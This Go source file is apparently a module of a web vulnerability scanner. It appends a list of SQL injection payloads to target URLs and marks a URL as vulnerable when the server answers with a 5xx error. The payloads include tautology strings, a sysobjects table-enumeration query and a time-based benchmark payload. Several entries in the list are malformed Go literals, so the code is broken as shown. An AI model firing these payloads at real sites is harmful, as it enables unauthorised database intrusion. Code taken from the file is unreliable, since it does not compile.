package modules

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

type SQLiResult struct {
	URL      string
	Vulnerable bool
}

var payloads = []string{
	"'",
	"\"",
	"' OR '1'='1",
	"\" OR \"1\"=\"1",
	"' OR 1=1--",
	"\" OR 1=1--",
        'LIKE',
        ' OR '' = ',
        " OR 1 = 1 -- -,
        1' ORDER BY 1--+,
        ' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,
        ')) or benchmark(10000000,MD5(1))#,
}

func ScanSQLi(targets []string) []SQLiResult {
	var results []SQLiResult
	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, url := range targets {
		for _, payload := range payloads {
			testURL := injectPayload(url, payload)
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode >= 500 && resp.StatusCode <= 599 {
				results = append(results, SQLiResult{
					URL:        testURL,
					Vulnerable: true,
				})
				break
			}
		}
	}
	return results
}

func injectPayload(url, payload string) string {
	if strings.Contains(url, "?") {
		return url + payload
	}
	return url + "/?" + payload
}
